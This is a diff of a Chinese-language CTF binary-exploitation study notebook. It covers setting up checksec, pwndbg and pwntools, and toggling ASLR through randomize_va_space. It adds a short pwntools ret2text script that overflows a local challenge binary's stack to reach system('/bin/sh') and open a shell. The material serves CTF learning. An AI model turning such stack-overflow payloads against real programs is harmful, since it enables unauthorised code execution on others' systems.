@@ -1,4 +1,4 @@
-- main author: hex, https://github.com/hex-16
+- writer: github.com/hex-16   data: from 2020   contact: hexhex16@outlook.com
 - 未加说明时，默认系统为kali 20.04(64bit), python3.7或以上, 其余套件为2021.3前后的最新版
 - 部分内容与 Reverse.md 有重叠，部分交叉内容会记录在Reverse.md 中，会有注明
 
@@ -15,9 +15,17 @@
 
 
 
+## checksec
+
+
+
+
+
 ## pwndbg
 
 > https://github.com/pwndbg/pwndbg
+>
+> https://blog.csdn.net/Breeze_CAT/article/details/103789233  指令参考
 
 Installation:
 
@@ -85,7 +93,7 @@ python3 -m pip install --upgrade pwntools
 
 
 
-### Cases
+### Tutorials
 
 > https://docs.pwntools.com/en/latest/intro.html
 >
@@ -168,6 +176,8 @@ u8(b'A') == 0x41 # True # 两者等效
 
 ```python
 context.binary = './challenge-binary' # 自动设置所有适当的值 # 官方文档推荐方法
+print(context) # example output:
+# ContextType(arch = 'i386', binary = ELF('/home/kali/CTF/pwn/ret2shellcode'), bits = 32, endian = 'little', os = 'linux')
 ```
 
 
@@ -231,6 +241,8 @@ disasm(open('/tmp/quiet-cat','rb').read(1))
 ```
 
 
+
+### Cases
 
 
 
@@ -789,6 +801,8 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
+### Linux ASLR修改
+
 修改`/proc/sys/kernel/randomize_va_space`来控制ASLR启动与否，具体选项：
 
 - 0: 关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同
@@ -828,7 +842,17 @@ sh.interactive() # 将代码交互转换为手工交互
 - 也可以控制程序执行好几段不相邻的已有代码(gadgets)
 - 需要知道对应的返回的代码的位置
 
-> 案例ret2text见  https://github.com/hex-16/CTF-detailed-writeups/tree/main/pwn/demo_ROP_ret2text
+> 案例ret2text见  https://github.com/hex-16/CTF-detailed-writeups/tree/main/pwn/demo_ROP_ret2text , 所使用的脚本：
+>
+> ```python
+> # python3 pwntools
+> from pwn import *
+> sh = process('./ret2text')
+> target = 0x804863a # 这个是 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
+> payload = b'A' * (0x6c + 4) + p32(target) # 这里是前面分析的字符串 s 与 return address 之间的偏移量
+> sh.sendline(payload)
+> sh.interactive()
+> ```
 >
 > 该案例总结：
 >
@@ -838,7 +862,7 @@ sh.interactive() # 将代码交互转换为手工交互
 >
 > 比赛案例：
 >
-> - NahamCon 2021 (ctf.nahamcon.com): Ret2basic: 没开canary等保护，找到打开`flag.txt`的函数，覆盖return address就行了，栈分析可以用gdb也可以用IDA(没分析错)。这类题没有其他操作就是巨简单。
+> - NahamCon 2021 (ctf.nahamcon.com): Ret2basic: 没开canary等保护，找到打开`flag.txt`的函数，覆盖return address就行了，栈分析可以用gdb也可以用IDA(没分析错)。
 
 
 
